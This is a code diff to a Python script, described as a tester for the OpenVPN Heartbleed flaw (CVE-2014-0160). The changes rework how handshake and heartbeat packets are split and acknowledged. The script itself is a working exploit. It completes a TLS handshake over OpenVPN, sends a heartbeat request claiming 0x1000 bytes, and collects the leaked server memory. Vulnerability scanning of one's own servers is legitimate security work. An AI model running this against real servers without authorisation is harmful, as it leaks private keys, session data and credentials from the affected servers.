@@ -17,30 +17,13 @@ target = None
 
 # OpenVPN Session ID
 lsesseionid = 0x12345678
+packetid = 0
 
 options = OptionParser(usage='%prog server [options]', description='Test for TLS heartbeat vulnerability on OpenVPN Server (CVE-2014-0160)')
 options.add_option('-p', '--port', type='int', default=1194, help='Port to test (default: 1194)')
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
-
-hello = h2bin('''
-16 03 02 00  dc 01 00 00 d8 03 02 53
-43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
-bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
-00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
-00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
-c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
-c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
-c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
-c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
-00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
-03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
-00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
-00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
-00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01                                  
-''')
 
 hello_openvpn = h2bin('''
 16 03 01 00 df 01 00 00 db 03 01 95 a3 8a 7f 46
@@ -58,12 +41,6 @@ c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16
 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00
 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00
 0f 00 01 01
-''')
-
-hb = h2bin(''' 
-18 03 01 00 03
-01 40 00
-4559 4c4c 574f 5320 4255 414d 4952 454e
 ''')
 
 # Get OpenVPN header...
@@ -116,6 +93,27 @@ def hexdump(src, length=8):
        result.append( b"%04X   %-*s   %s" % (i, length*(digits + 1), hexa, text) )
     return b'\n'.join(result)
 
+def send_message(s, data):
+    global packetid
+    start = 0
+    length = 0
+    cnt = 0
+    bytes_remaining = len(data)
+    while bytes_remaining > 0:
+        if bytes_remaining > 100:
+            length = 100
+        else:
+            length = bytes_remaining
+
+        s.send(struct.pack('>bQbi{0}s'.format(length), 0x20, lsesseionid, 0, packetid, data[start:start+length]))
+        sys.stdout.flush()
+
+        packetid += 1
+        cnt += 1
+        bytes_remaining -= length
+        start += length
+    return cnt
+
 def handle_message(s):
     global lsesseionid
     data = s.recv(1024)
@@ -133,12 +131,12 @@ def handle_message(s):
         #print "Ack received"
         return typ, sessionid, packarrlen, None, None
 
+    # Send ACK..
     packid = msg_id(data[pos:pos+4])
+    s.send(struct.pack('>bQbiQ', 0x28, lsesseionid, 1, packid, sessionid))
 
     if typ == 0x20:
         #print "Control Message received"
-        # Send Ack...
-        s.send(struct.pack('>bQbiQ', 0x28, lsesseionid, 1, packid, sessionid))
         return typ, sessionid, packarrlen, packid, data[pos+4:]
 
     return typ, sessionid, packarrlen, packid, None
@@ -146,6 +144,8 @@ def handle_message(s):
 def main():
     global target
     global lsesseionid
+    global packetid
+
     opts, args = options.parse_args()
     if len(args) < 1:
         options.print_help()
@@ -158,35 +158,15 @@ def main():
     s.connect((target, opts.port))
     sys.stdout.flush()
 
-    s.send(struct.pack('>bqbi', 0x38, lsesseionid, 0, 0))
+    s.send(struct.pack('>bqbi', 0x38, lsesseionid, 0, packetid))
+    packetid += 1
 
     typ, sessionid, packarrlen, packid, payload = handle_message(s)
 
-#    typ, sessionid, pidarr, pid, pay = recvmsg(s, 0)
-
-#    s.send(struct.pack('>bQbiQ', 0x28, lsesseionid, 1, 0, sessionid))
-#    sys.stdout.flush()
-
-
-    s.send(struct.pack('>bQbi100s', 0x20, lsesseionid, 0, 1, hello_openvpn[0:100]))
-    sys.stdout.flush()
-
-    handle_message(s)
-
-    s.send(struct.pack('>bQbi100s', 0x20, lsesseionid, 0, 2, hello_openvpn[100:200]))
-    sys.stdout.flush()
-
-    handle_message(s)
-
-    s.send(struct.pack('>bQbi28s', 0x20, lsesseionid, 0, 3, hello_openvpn[200:228]))
-    sys.stdout.flush()
+    send_message(s, hello_openvpn)
 
     while True:
         typ, sessionid, packarrlen, packid, payload = handle_message(s)
-
-        if packid != None:
-            s.send(struct.pack('>bQbiQ', 0x28, lsesseionid, 1, packid, sessionid))
-            sys.stdout.flush()
 
         # Look for server hello done message.
         if typ == 0x20 and len(payload) < 100:
@@ -198,8 +178,7 @@ def main():
 
     hb_length = 0x1000
     hb = msg_tls_heartbeat_request("Heartbleed test payload", hb_length)
-    s.send(struct.pack('>bQbi{0}s'.format(len(hb)), 0x20, lsesseionid, 0, 4, hb))
-    sys.stdout.flush()
+    send_message(s, hb)
 
     hb_received = False
     heartbleed = ""
@@ -219,7 +198,7 @@ def main():
                 check_hb(tlstype, tlsversion, tlslength)
         elif typ == 0x28:
             # We received ack only, the server ignored our heartbeat
-            print target + '|NOT VULNERABLE'
+            print target + '|NOT VULNERABLE (only ACK received)'
             return
 
         if len(heartbleed) >= hb_length + 5:
